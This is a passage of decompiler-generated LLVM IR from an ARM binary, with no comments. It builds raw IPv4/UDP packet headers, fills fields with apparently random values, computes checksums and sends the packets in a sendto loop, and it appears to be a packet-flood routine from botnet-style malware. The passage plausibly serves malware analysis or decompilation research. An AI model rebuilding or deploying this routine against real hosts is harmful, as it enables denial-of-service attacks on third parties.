  %v5_ce94 = add i32 %v4_ce94, %v4_cb44
  %v6_ce94 = inttoptr i32 %v5_ce94 to i32*
  %v7_ce94 = load i32, i32* %v6_ce94, align 4
  store i32 %v7_ce94, i32* @r5, align 4
  %v7_ce98 = icmp eq i8 %v3_ce90, 31
  store i1 %v7_ce98, i1* %cpsr_z.global-to-local, align 1
  %v1_ce9c = add i32 %v7_ce94, 20
  store i32 %v1_ce9c, i32* @r6, align 4
  %tmp84 = icmp ult i8 %v3_ce90, 32
  br i1 %tmp84, label %dec_label_pc_cf9c, label %dec_label_pc_cea4

dec_label_pc_cea4:                                ; preds = %dec_label_pc_ce80
  store i32 %v6_cc4c, i32* %r0.global-to-local, align 4
  store i1 %v2_cea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cea8, label %dec_label_pc_d004, label %dec_label_pc_ceb0

dec_label_pc_ceb0:                                ; preds = %dec_label_pc_cf9c, %dec_label_pc_cea4
  store i32 %v3_ccd4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d014, label %dec_label_pc_d020, label %dec_label_pc_cec4

dec_label_pc_cec4:                                ; preds = %dec_label_pc_d004.dec_label_pc_cec4_crit_edge, %dec_label_pc_ceb0
  %v1_cec8 = phi i32 [ %v1_cec8.pre, %dec_label_pc_d004.dec_label_pc_cec4_crit_edge ], [ 65535, %dec_label_pc_ceb0 ]
  store i32 %v3_ccb8, i32* %r2.global-to-local, align 4
  %v9_cec8 = icmp eq i32 %v3_ccb8, %v1_cec8
  store i1 %v9_cec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cec8, label %dec_label_pc_d03c, label %dec_label_pc_ced0

dec_label_pc_ced0:                                ; preds = %dec_label_pc_d020.dec_label_pc_ced0_crit_edge, %dec_label_pc_cec4
  %v1_ced4 = phi i32 [ %v1_ced4.pre, %dec_label_pc_d020.dec_label_pc_ced0_crit_edge ], [ %v1_cec8, %dec_label_pc_cec4 ]
  store i32 %v3_ccd8, i32* %r3.global-to-local, align 4
  %v9_ced4 = icmp eq i32 %v3_ccd8, %v1_ced4
  store i1 %v9_ced4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ced4, label %dec_label_pc_d058, label %dec_label_pc_cedc

dec_label_pc_cedc:                                ; preds = %dec_label_pc_d03c, %dec_label_pc_ced0
  store i32 %v1_cc38, i32* %ip.global-to-local, align 4
  store i1 %v2_cee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cee0, label %dec_label_pc_cee8, label %dec_label_pc_d074

dec_label_pc_cee8:                                ; preds = %dec_label_pc_cedc, %dec_label_pc_d058, %dec_label_pc_d074
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ceec = load i32, i32* @r7, align 4
  %v1_ceec = trunc i32 %v0_ceec to i8
  %v2_ceec = load i32, i32* @r5, align 4
  %v3_ceec = add i32 %v2_ceec, 10
  %v4_ceec = inttoptr i32 %v3_ceec to i8*
  store i8 %v1_ceec, i8* %v4_ceec, align 1
  %v0_cef0 = load i32, i32* @r7, align 4
  %v1_cef0 = trunc i32 %v0_cef0 to i8
  %v2_cef0 = load i32, i32* @r5, align 4
  %v3_cef0 = add i32 %v2_cef0, 11
  %v4_cef0 = inttoptr i32 %v3_cef0 to i8*
  store i8 %v1_cef0, i8* %v4_cef0, align 1
  %v0_cef4 = load i32, i32* @r5, align 4
  store i32 %v0_cef4, i32* @r0, align 4
  %v2_cef8 = call i32 @function_de24(i32 %v0_cef4, i32 20)
  %v3_cef8 = trunc i32 %v2_cef8 to i8
  store i32 %v2_cef8, i32* %r0.global-to-local, align 4
  %v4_cefc = sdiv i32 %v2_cef8, 256
  store i32 %v4_cefc, i32* %r3.global-to-local, align 4
  %v1_cf00 = trunc i32 %v4_cefc to i8
  %v2_cf00 = load i32, i32* @r5, align 4
  %v3_cf00 = add i32 %v2_cf00, 11
  %v4_cf00 = inttoptr i32 %v3_cf00 to i8*
  store i8 %v1_cf00, i8* %v4_cf00, align 1
  %v3_cf04 = load i32, i32* @r5, align 4
  %v4_cf04 = add i32 %v3_cf04, 10
  %v5_cf04 = inttoptr i32 %v4_cf04 to i8*
  store i8 %v3_cef8, i8* %v5_cf04, align 1
  %v0_cf08 = load i32, i32* @r7, align 4
  %v1_cf08 = trunc i32 %v0_cf08 to i8
  %v2_cf08 = load i32, i32* @r6, align 4
  %v3_cf08 = add i32 %v2_cf08, 6
  %v4_cf08 = inttoptr i32 %v3_cf08 to i8*
  store i8 %v1_cf08, i8* %v4_cf08, align 1
  %v0_cf0c = load i32, i32* @r7, align 4
  %v1_cf0c = trunc i32 %v0_cf0c to i8
  %v2_cf0c = load i32, i32* @r6, align 4
  %v3_cf0c = add i32 %v2_cf0c, 7
  %v4_cf0c = inttoptr i32 %v3_cf0c to i8*
  store i8 %v1_cf0c, i8* %v4_cf0c, align 1
  %v0_cf10 = load i32, i32* @r5, align 4
  %v1_cf10 = add i32 %v0_cf10, 24
  %v2_cf10 = inttoptr i32 %v1_cf10 to i8*
  %v3_cf10 = load i8, i8* %v2_cf10, align 1
  %v4_cf10 = zext i8 %v3_cf10 to i32
  store i32 %v4_cf10, i32* %r3.global-to-local, align 4
  %v1_cf14 = add i32 %v0_cf10, 25
  %v2_cf14 = inttoptr i32 %v1_cf14 to i8*
  %v3_cf14 = load i8, i8* %v2_cf14, align 1
  %v4_cf14 = zext i8 %v3_cf14 to i32
  %v0_cf18 = load i32, i32* @r6, align 4
  store i32 %v0_cf18, i32* @r1, align 4
  %v4_cf1c = mul nuw nsw i32 %v4_cf14, 256
  %v5_cf1c = or i32 %v4_cf1c, %v4_cf10
  store i32 %v5_cf1c, i32* %r2.global-to-local, align 4
  store i32 %v0_cf10, i32* %r0.global-to-local, align 4
  %v0_cf24 = load i32, i32* @sb, align 4
  store i32 %v0_cf24, i32* %r3.global-to-local, align 4
  %v4_cf28 = call i32 @function_de80(i32 %v0_cf10, i32 %v0_cf18, i32 %v5_cf1c, i32 %v0_cf24)
  %v5_cf28 = trunc i32 %v4_cf28 to i8
  store i32 %v4_cf28, i32* %r0.global-to-local, align 4
  %v4_cf2c38 = udiv i32 %v4_cf28, 256
  %v1_cf30 = trunc i32 %v4_cf2c38 to i8
  %v2_cf30 = load i32, i32* @r6, align 4
  %v3_cf30 = add i32 %v2_cf30, 7
  %v4_cf30 = inttoptr i32 %v3_cf30 to i8*
  store i8 %v1_cf30, i8* %v4_cf30, align 1
  %v3_cf34 = load i32, i32* @r6, align 4
  %v4_cf34 = add i32 %v3_cf34, 6
  %v5_cf34 = inttoptr i32 %v4_cf34 to i8*
  store i8 %v5_cf28, i8* %v5_cf34, align 1
  %v3_cf38 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cf38, i32* %r3.global-to-local, align 4
  %v0_cf3c = load i32, i32* @r5, align 4
  %v1_cf3c = add i32 %v0_cf3c, 20
  %v2_cf3c = inttoptr i32 %v1_cf3c to i32*
  %v3_cf3c = load i32, i32* %v2_cf3c, align 4
  %v3_cf44 = udiv i32 %v3_cf3c, 65536
  store i32 %v3_cf44, i32* %r2.global-to-local, align 4
  %v5_cf48 = mul i32 %v3_cf38, 24
  %v1_cf4c = load i32, i32* @r8, align 4
  %v2_cf4c = add i32 %v1_cf4c, %v5_cf48
  store i32 %v2_cf4c, i32* %ip.global-to-local, align 4
  %v3_cf5035 = udiv i32 %v3_cf3c, 16777216
  %v1_cf54 = trunc i32 %v3_cf5035 to i8
  %v3_cf54 = add i32 %v2_cf4c, 3
  %v4_cf54 = inttoptr i32 %v3_cf54 to i8*
  store i8 %v1_cf54, i8* %v4_cf54, align 1
  %v0_cf58 = load i32, i32* %r2.global-to-local, align 4
  %v1_cf58 = trunc i32 %v0_cf58 to i8
  %v2_cf58 = load i32, i32* %ip.global-to-local, align 4
  %v3_cf58 = add i32 %v2_cf58, 2
  %v4_cf58 = inttoptr i32 %v3_cf58 to i8*
  store i8 %v1_cf58, i8* %v4_cf58, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_cf60 = load i32, i32* @r5, align 4
  store i32 %v0_cf60, i32* %r1.global-to-local, align 4
  store i32 %v3_cc60, i32* %r0.global-to-local, align 4
  %v0_cf68 = load i32, i32* @fp, align 4
  store i32 %v0_cf68, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_cf70 = load i32, i32* %ip.global-to-local, align 4
  %v4_cf70 = inttoptr i32 %v0_cf70 to %sockaddr*
  %v7_cf78 = inttoptr i32 %v0_cf60 to i32*
  %v9_cf78 = call i32 @sendto(i32 %v3_cc60, i32* %v7_cf78, i32 %v0_cf68, i32 16384, %sockaddr* %v4_cf70, i32 16)
  %v3_cf7c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cf7c, i32* %r3.global-to-local, align 4
  %v1_cf80 = add i32 %v3_cf7c, 1
  store i32 %v1_cf80, i32* %r0.global-to-local, align 4
  %v1_cf84 = load i32, i32* @sl, align 4
  %v9_cf84 = icmp eq i32 %v1_cf80, %v1_cf84
  store i1 %v9_cf84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cf80, i32* %stack_var_-40, align 4
  %v5_cf8c = icmp slt i32 %v1_cf80, %v1_cf84
  br i1 %v5_cf8c, label %dec_label_pc_ce80, label %dec_label_pc_cf90

dec_label_pc_cf90:                                ; preds = %dec_label_pc_cee8
  %v2_cf90 = icmp eq i32 %v1_cf84, 0
  store i1 %v2_cf90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ce70.outer

dec_label_pc_cf9c:                                ; preds = %dec_label_pc_ce80
  %v1_cf9c = add i32 %v2_ce88, 16
  %v2_cf9c = inttoptr i32 %v1_cf9c to i32*
  %v3_cf9c = load i32, i32* %v2_cf9c, align 4
  store i32 %v3_cf9c, i32* %r4.global-to-local, align 4
  %v0_cfa0 = call i32 @function_f6c4()
  store i32 %v0_cfa0, i32* %r0.global-to-local, align 4
  %v3_cfa4 = load i32, i32* %stack_var_-40, align 4
  %v5_cfac = mul i32 %v3_cfa4, 24
  %v1_cfb4 = load i32, i32* @r8, align 4
  %v2_cfb4 = add i32 %v1_cfb4, %v5_cfac
  store i32 %v2_cfb4, i32* %r1.global-to-local, align 4
  %v1_cfb8 = and i32 %v3_cf9c, 65280
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  %v1_cfb0 = udiv i32 %v3_cf9c, 256
  %v3_cfbc = and i32 %v1_cfb0, 65280
  store i32 %v3_cfbc, i32* %r2.global-to-local, align 4
  %v3_cfc0 = mul i32 %v3_cf9c, 16777216
  store i32 %v3_cfc0, i32* %ip.global-to-local, align 4
  %v1_cfc4 = add i32 %v2_cfb4, 20
  %v2_cfc4 = inttoptr i32 %v1_cfc4 to i8*
  %v3_cfc4 = load i8, i8* %v2_cfc4, align 1
  %v4_cfc4 = zext i8 %v3_cfc4 to i32
  %v4_cfc8 = mul nuw nsw i32 %v1_cfb8, 256
  %v5_cfc8 = or i32 %v4_cfc8, %v3_cfc0
  store i32 %v5_cfc8, i32* %ip.global-to-local, align 4
  %v2_cfd0 = call i32 @llvm.bswap.i32(i32 %v3_cf9c)
  %v7_cfd4 = lshr i32 %v0_cfa0, %v4_cfc4
  %v8_cfd4 = add i32 %v7_cfd4, %v2_cfd0
  store i32 %v8_cfd4, i32* %r2.global-to-local, align 4
  %v3_cfe0 = mul i32 %v8_cfd4, 16777216
  %v1_cfd8 = mul i32 %v8_cfd4, 256
  %v4_cfe4 = and i32 %v1_cfd8, 16711680
  %v5_cfe4 = or i32 %v4_cfe4, %v3_cfe0
  store i32 %v5_cfe4, i32* %r1.global-to-local, align 4
  store i32 %v6_cc4c, i32* %r0.global-to-local, align 4
  %v2_cff4 = call i32 @llvm.bswap.i32(i32 %v8_cfd4)
  store i32 %v2_cff4, i32* %r3.global-to-local, align 4
  store i1 %v2_cea8, i1* %cpsr_z.global-to-local, align 1
  %v1_cffc = load i32, i32* @r5, align 4
  %v2_cffc = add i32 %v1_cffc, 16
  %v3_cffc = inttoptr i32 %v2_cffc to i32*
  store i32 %v2_cff4, i32* %v3_cffc, align 4
  br i1 %v2_cea8, label %dec_label_pc_d004, label %dec_label_pc_ceb0

dec_label_pc_d004:                                ; preds = %dec_label_pc_cf9c, %dec_label_pc_cea4
  %v0_d004 = call i32 @function_f6c4()
  store i32 %v0_d004, i32* %r0.global-to-local, align 4
  store i32 %v3_ccd4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d014, i1* %cpsr_z.global-to-local, align 1
  %v1_d018 = load i32, i32* @r5, align 4
  %v2_d018 = add i32 %v1_d018, 12
  %v3_d018 = inttoptr i32 %v2_d018 to i32*
  store i32 %v0_d004, i32* %v3_d018, align 4
  br i1 %v3_d014, label %dec_label_pc_d020, label %dec_label_pc_d004.dec_label_pc_cec4_crit_edge

dec_label_pc_d004.dec_label_pc_cec4_crit_edge:    ; preds = %dec_label_pc_d004
  %v1_cec8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cec4

dec_label_pc_d020:                                ; preds = %dec_label_pc_d004, %dec_label_pc_ceb0
  %v0_d020 = call i32 @function_f6c4()
  %v1_d020 = trunc i32 %v0_d020 to i8
  store i32 %v0_d020, i32* %r0.global-to-local, align 4
  store i32 %v3_ccb8, i32* %r2.global-to-local, align 4
  %v4_d028 = sdiv i32 %v0_d020, 256
  store i32 %v4_d028, i32* %r3.global-to-local, align 4
  %v1_d02c = load i32, i32* @r4, align 4
  %v9_d02c = icmp eq i32 %v3_ccb8, %v1_d02c
  store i1 %v9_d02c, i1* %cpsr_z.global-to-local, align 1
  %v1_d030 = trunc i32 %v4_d028 to i8
  %v2_d030 = load i32, i32* @r5, align 4
  %v3_d030 = add i32 %v2_d030, 5
  %v4_d030 = inttoptr i32 %v3_d030 to i8*
  store i8 %v1_d030, i8* %v4_d030, align 1
  %v3_d034 = load i32, i32* @r5, align 4
  %v4_d034 = add i32 %v3_d034, 4
  %v5_d034 = inttoptr i32 %v4_d034 to i8*
  store i8 %v1_d020, i8* %v5_d034, align 1
  %v0_d038 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d038, label %dec_label_pc_d03c, label %dec_label_pc_d020.dec_label_pc_ced0_crit_edge

dec_label_pc_d020.dec_label_pc_ced0_crit_edge:    ; preds = %dec_label_pc_d020
  %v1_ced4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ced0

dec_label_pc_d03c:                                ; preds = %dec_label_pc_d020, %dec_label_pc_cec4
  %v0_d03c = call i32 @function_f6c4()
  %v1_d03c = trunc i32 %v0_d03c to i8
  store i32 %v0_d03c, i32* %r0.global-to-local, align 4
  %v4_d040 = sdiv i32 %v0_d03c, 256
  store i32 %v4_d040, i32* %r3.global-to-local, align 4
  %v3_d044 = load i32, i32* @r5, align 4
  %v4_d044 = add i32 %v3_d044, 20
  %v5_d044 = inttoptr i32 %v4_d044 to i8*
  store i8 %v1_d03c, i8* %v5_d044, align 1
  %v0_d048 = load i32, i32* %r3.global-to-local, align 4
  %v1_d048 = trunc i32 %v0_d048 to i8
  %v2_d048 = load i32, i32* @r6, align 4
  %v3_d048 = add i32 %v2_d048, 1
  %v4_d048 = inttoptr i32 %v3_d048 to i8*
  store i8 %v1_d048, i8* %v4_d048, align 1
  store i32 %v3_ccd8, i32* %r3.global-to-local, align 4
  %v1_d050 = load i32, i32* @r4, align 4
  %v9_d050 = icmp eq i32 %v3_ccd8, %v1_d050
  store i1 %v9_d050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d050, label %dec_label_pc_d058, label %dec_label_pc_cedc

dec_label_pc_d058:                                ; preds = %dec_label_pc_d03c, %dec_label_pc_ced0
  %v0_d058 = call i32 @function_f6c4()
  %v1_d058 = trunc i32 %v0_d058 to i8
  store i32 %v0_d058, i32* %r0.global-to-local, align 4
  store i32 %v1_cc38, i32* %ip.global-to-local, align 4
  %v4_d060 = sdiv i32 %v0_d058, 256
  store i32 %v4_d060, i32* %r3.global-to-local, align 4
  store i1 %v2_cee0, i1* %cpsr_z.global-to-local, align 1
  %v1_d068 = trunc i32 %v4_d060 to i8
  %v2_d068 = load i32, i32* @r6, align 4
  %v3_d068 = add i32 %v2_d068, 3
  %v4_d068 = inttoptr i32 %v3_d068 to i8*
  store i8 %v1_d068, i8* %v4_d068, align 1
  %v3_d06c = load i32, i32* @r6, align 4
  %v4_d06c = add i32 %v3_d06c, 2
  %v5_d06c = inttoptr i32 %v4_d06c to i8*
  store i8 %v1_d058, i8* %v5_d06c, align 1
  %v0_d070 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d070, label %dec_label_pc_cee8, label %dec_label_pc_d074

dec_label_pc_d074:                                ; preds = %dec_label_pc_cedc, %dec_label_pc_d058
  %v0_d074 = load i32, i32* @r5, align 4
  %v1_d074 = add i32 %v0_d074, 28
  store i32 %v1_d074, i32* %r0.global-to-local, align 4
  store i32 %v0_ccb0, i32* @r1, align 4
  %v1_d07c = inttoptr i32 %v1_d074 to i8*
  %v2_d07c = call i32 @function_f844(i8* %v1_d07c)
  store i32 %v2_d07c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cee8

dec_label_pc_d084:                                ; preds = %dec_label_pc_cc70
  store i32 %v3_cc60, i32* %r0.global-to-local, align 4
  %v1_d088 = call i32 @close(i32 %v3_cc60)
  store i32 %v1_d088, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d08c

dec_label_pc_d08c:                                ; preds = %dec_label_pc_cb24, %dec_label_pc_d084
  %v29_d090 = phi i32 [ -1, %dec_label_pc_cb24 ], [ %v1_d088, %dec_label_pc_d084 ]
  store i32 %v3_cb24, i32* %r4.global-to-local, align 4
  store i32 %v6_cb24, i32* %r5.global-to-local, align 4
  store i32 %v9_cb24, i32* %r6.global-to-local, align 4
  store i32 %v12_cb24, i32* %r7.global-to-local, align 4
  store i32 %v18_cb24, i32* %sb.global-to-local, align 4
  store i32 %v24_cb24, i32* %fp.global-to-local, align 4
  ret i32 %v29_d090

dec_label_pc_d094:                                ; preds = %dec_label_pc_ccf4
  %v3_d098 = sext i8 %v5_cd58 to i32
  %v7_d098 = sext i8 %v5_cd5c to i32
  %v3_d09c = sdiv i32 %v3_d098, 256
  store i32 %v3_d09c, i32* %r0.global-to-local, align 4
  %v3_d0a0 = sdiv i32 %v7_d098, 256
  store i32 %v3_d0a0, i32* %r1.global-to-local, align 4
  store i32 %v1_cd30, i32* %r2.global-to-local, align 4
  store i32 %v1_cd34, i32* %r3.global-to-local, align 4
  %v3_d0ac34 = udiv i32 %v1_cd4c, 256
  store i32 %v3_d0ac34, i32* %ip.global-to-local, align 4
  %v5_d0c0 = trunc i32 %v3_d0ac34 to i8
  store i32 0, i32* %r6.global-to-local, align 4
  %sext12 = mul i32 %v0_ccb4, 16777216
  %v4_d180 = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v0_ccc4, 16777216
  %v4_d190 = sdiv i32 %sext13, 16777216
  %v1_d198 = trunc i32 %v4_d190 to i8
  br label %dec_label_pc_d0c8

dec_label_pc_d0c8:                                ; preds = %dec_label_pc_d0c8, %dec_label_pc_d094
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d0d4 = call i32* @calloc(i32 1510, i32 1)
  %v4_d0d4 = ptrtoint i32* %v2_d0d4 to i32
  store i32 %v4_d0d4, i32* %r0.global-to-local, align 4
  store i32 %v4_cb44, i32* %r1.global-to-local, align 4
  %v3_d0dc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d0dc, i32* %r2.global-to-local, align 4
  %v2_d0e0 = load i32, i32* %r6.global-to-local, align 4
  %v5_d0e0 = mul i32 %v2_d0e0, 4
  %v6_d0e0 = add i32 %v5_d0e0, %v4_cb44
  %v7_d0e0 = inttoptr i32 %v6_d0e0 to i32*
  store i32 %v4_d0d4, i32* %v7_d0e0, align 4
  %v0_d0e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d0e4 = load i32, i32* %r2.global-to-local, align 4
  %v4_d0e4 = mul i32 %v1_d0e4, 4
  %v5_d0e4 = add i32 %v4_d0e4, %v0_d0e4
  %v6_d0e4 = inttoptr i32 %v5_d0e4 to i32*
  %v7_d0e4 = load i32, i32* %v6_d0e4, align 4
  store i32 %v7_d0e4, i32* %r1.global-to-local, align 4
  %v1_d0e8 = inttoptr i32 %v7_d0e4 to i8*
  %v2_d0e8 = load i8, i8* %v1_d0e8, align 1
  %tmp85 = urem i8 %v2_d0e8, 16
  %v1_d0ec = zext i8 %tmp85 to i32
  %v1_d0f0 = or i32 %v1_d0ec, 64
  store i32 %v1_d0f0, i32* %r3.global-to-local, align 4
  %v1_d0f4 = trunc i32 %v1_d0f0 to i8
  store i8 %v1_d0f4, i8* %v1_d0e8, align 1
  %v0_d0f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d0f8 = inttoptr i32 %v0_d0f8 to i8*
  %v2_d0f8 = load i8, i8* %v1_d0f8, align 1
  %v3_d0f8 = zext i8 %v2_d0f8 to i32
  %v1_d0fc = and i32 %v3_d0f8, 240
  %v1_d100 = or i32 %v1_d0fc, 5
  store i32 %v1_d100, i32* %r2.global-to-local, align 4
  %v3_d108 = add i32 %v0_d0f8, 9
  %v4_d108 = inttoptr i32 %v3_d108 to i8*
  store i8 17, i8* %v4_d108, align 1
  %v0_d10c = load i32, i32* %r2.global-to-local, align 4
  %v1_d10c = trunc i32 %v0_d10c to i8
  %v2_d10c = load i32, i32* %r1.global-to-local, align 4
  %v3_d10c = inttoptr i32 %v2_d10c to i8*
  store i8 %v1_d10c, i8* %v3_d10c, align 1
  %v2_d114 = load i32, i32* %r1.global-to-local, align 4
  %v3_d114 = add i32 %v2_d114, 1
  %v4_d114 = inttoptr i32 %v3_d114 to i8*
  store i8 %v5_cb7c, i8* %v4_d114, align 1
  store i32 %v6_cb98, i32* %r0.global-to-local, align 4
  %v2_d11c = load i32, i32* %r1.global-to-local, align 4
  %v3_d11c = add i32 %v2_d11c, 8
  %v4_d11c = inttoptr i32 %v3_d11c to i8*
  store i8 %v5_cbb4, i8* %v4_d11c, align 1
  %v3_d120 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d120, i32* %r2.global-to-local, align 4
  store i32 %v6_cc4c, i32* %ip.global-to-local, align 4
  %v3_d128 = mul i32 %v3_d120, 32
  store i32 %v3_d128, i32* %r3.global-to-local, align 4
  %v1_d12c = load i32, i32* %r1.global-to-local, align 4
  %v2_d12c = add i32 %v1_d12c, 12
  %v3_d12c = inttoptr i32 %v2_d12c to i32*
  store i32 %v6_cc4c, i32* %v3_d12c, align 4
  %v0_d130 = load i32, i32* %r3.global-to-local, align 4
  %v1_d130 = load i32, i32* %r2.global-to-local, align 4
  %tmp86 = mul i32 %v1_d130, -8
  %v5_d130 = add i32 %v0_d130, %tmp86
  %v1_d134 = load i32, i32* @r8, align 4
  %v2_d134 = add i32 %v5_d130, %v1_d134
  store i32 %v2_d134, i32* %r3.global-to-local, align 4
  %v1_d138 = add i32 %v2_d134, 16
  %v2_d138 = inttoptr i32 %v1_d138 to i32*
  %v3_d138 = load i32, i32* %v2_d138, align 4
  %v1_d13c = load i32, i32* %r1.global-to-local, align 4
  %v2_d13c = add i32 %v1_d13c, 16
  %v3_d13c = inttoptr i32 %v2_d13c to i32*
  store i32 %v3_d138, i32* %v3_d13c, align 4
  %v0_d144 = load i32, i32* %r2.global-to-local, align 4
  %v1_d144 = add i32 %v0_d144, 1
  store i32 %v1_d144, i32* %r6.global-to-local, align 4
  store i32 %v7_d098, i32* %ip.global-to-local, align 4
  store i32 %v3_d09c, i32* %r2.global-to-local, align 4
  %v2_d150 = load i32, i32* %r1.global-to-local, align 4
  %v3_d150 = add i32 %v2_d150, 2
  %v4_d150 = inttoptr i32 %v3_d150 to i8*
  store i8 %v5_cd58, i8* %v4_d150, align 1
  store i32 %v3_d0a0, i32* %r0.global-to-local, align 4
  %v0_d158 = load i32, i32* %r2.global-to-local, align 4
  %v1_d158 = trunc i32 %v0_d158 to i8
  %v2_d158 = load i32, i32* %r1.global-to-local, align 4
  %v3_d158 = add i32 %v2_d158, 3
  %v4_d158 = inttoptr i32 %v3_d158 to i8*
  store i8 %v1_d158, i8* %v4_d158, align 1
  %v0_d15c = load i32, i32* %ip.global-to-local, align 4
  %v1_d15c = trunc i32 %v0_d15c to i8
  %v2_d15c = load i32, i32* %r1.global-to-local, align 4
  %v3_d15c = add i32 %v2_d15c, 4
  %v4_d15c = inttoptr i32 %v3_d15c to i8*
  store i8 %v1_d15c, i8* %v4_d15c, align 1
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_d168 = load i32, i32* %r1.global-to-local, align 4
  %v1_d168 = add i32 %v0_d168, 20
  store i32 %v1_d168, i32* %r3.global-to-local, align 4
  %v0_d16c = load i32, i32* %r0.global-to-local, align 4
  %v1_d16c = trunc i32 %v0_d16c to i8
  %v3_d16c = add i32 %v0_d168, 5
  %v4_d16c = inttoptr i32 %v3_d16c to i8*
  store i8 %v1_d16c, i8* %v4_d16c, align 1
  %v0_d170 = load i32, i32* %r2.global-to-local, align 4
  %v1_d170 = trunc i32 %v0_d170 to i8
  %v2_d170 = load i32, i32* %r1.global-to-local, align 4
  %v3_d170 = add i32 %v2_d170, 6
  %v4_d170 = inttoptr i32 %v3_d170 to i8*
  store i8 %v1_d170, i8* %v4_d170, align 1
  %v0_d174 = load i32, i32* %ip.global-to-local, align 4
  %v1_d174 = trunc i32 %v0_d174 to i8
  %v2_d174 = load i32, i32* %r1.global-to-local, align 4
  %v3_d174 = add i32 %v2_d174, 7
  %v4_d174 = inttoptr i32 %v3_d174 to i8*
  store i8 %v1_d174, i8* %v4_d174, align 1
  %v0_d178 = load i32, i32* %r4.global-to-local, align 4
  %v1_d178 = trunc i32 %v0_d178 to i8
  %v2_d178 = load i32, i32* %r1.global-to-local, align 4
  %v3_d178 = add i32 %v2_d178, 20
  %v4_d178 = inttoptr i32 %v3_d178 to i8*
  store i8 %v1_d178, i8* %v4_d178, align 1
  store i32 %v3_d0ac34, i32* %r0.global-to-local, align 4
  store i32 %v4_d180, i32* %r1.global-to-local, align 4
  %v2_d184 = load i32, i32* %r3.global-to-local, align 4
  %v3_d184 = add i32 %v2_d184, 5
  %v4_d184 = inttoptr i32 %v3_d184 to i8*
  store i8 %v5_d0c0, i8* %v4_d184, align 1
  %v0_d188 = load i32, i32* %r1.global-to-local, align 4
  %v1_d188 = trunc i32 %v0_d188 to i8
  %v2_d188 = load i32, i32* %r3.global-to-local, align 4
  %v3_d188 = add i32 %v2_d188, 1
  %v4_d188 = inttoptr i32 %v3_d188 to i8*
  store i8 %v1_d188, i8* %v4_d188, align 1
  %v0_d18c = load i32, i32* %r5.global-to-local, align 4
  %v1_d18c = trunc i32 %v0_d18c to i8
  %v2_d18c = load i32, i32* %r3.global-to-local, align 4
  %v3_d18c = add i32 %v2_d18c, 2
  %v4_d18c = inttoptr i32 %v3_d18c to i8*
  store i8 %v1_d18c, i8* %v4_d18c, align 1
  store i32 %v4_d190, i32* %r2.global-to-local, align 4
  %v0_d194 = load i32, i32* %r6.global-to-local, align 4
  %v1_d194 = load i32, i32* @sl, align 4
  %v9_d194 = icmp eq i32 %v0_d194, %v1_d194
  store i1 %v9_d194, i1* %cpsr_z.global-to-local, align 1
  %v2_d198 = load i32, i32* %r3.global-to-local, align 4
  %v3_d198 = add i32 %v2_d198, 3
  %v4_d198 = inttoptr i32 %v3_d198 to i8*
  store i8 %v1_d198, i8* %v4_d198, align 1
  %v0_d19c = load i32, i32* %r7.global-to-local, align 4
  %v1_d19c = trunc i32 %v0_d19c to i8
  %v2_d19c = load i32, i32* %r3.global-to-local, align 4
  %v3_d19c = add i32 %v2_d19c, 4
  %v4_d19c = inttoptr i32 %v3_d19c to i8*
  store i8 %v1_d19c, i8* %v4_d19c, align 1
  %v0_d1a0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_d1a0, i32* %stack_var_-40, align 4
  %v5_d1a4 = icmp slt i32 %v0_d194, %v1_d194
  br i1 %v5_d1a4, label %dec_label_pc_d0c8, label %dec_label_pc_ce68

; uselistorder directives
  uselistorder i32 %v3_d0ac34, { 2, 0, 1 }
  uselistorder i32 %v3_d0a0, { 1, 0 }
  uselistorder i32 %v3_d09c, { 1, 0 }
  uselistorder i32 %v7_d098, { 1, 0 }
  uselistorder i32 %v4_d060, { 1, 0 }
  uselistorder i32 %v0_d058, { 0, 2, 1 }
  uselistorder i32 %v0_d03c, { 0, 2, 1 }
  uselistorder i32 %v4_d028, { 1, 0 }
  uselistorder i32 %v0_d020, { 0, 2, 1 }
  uselistorder i32 %v2_cff4, { 1, 0 }
  uselistorder i32 %v8_cfd4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_cfc0, { 1, 0 }
  uselistorder i32 %v3_cf9c, { 1, 3, 2, 0, 4 }
  uselistorder i1 %v2_cf90, { 1, 0 }
  uselistorder i32 %v1_cf84, { 0, 2, 3, 1 }
  uselistorder i32 %v1_cf80, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_cf28, { 0, 2, 1 }
  uselistorder i32 %v0_cf10, { 1, 0, 2, 3 }
  uselistorder i32 %v4_cefc, { 1, 0 }
  uselistorder i32 %v2_cef8, { 0, 2, 1 }
  uselistorder i1 %v2_cea8, { 3, 0, 1, 2 }
  uselistorder i1 %v3_d014, { 1, 0, 2, 3 }
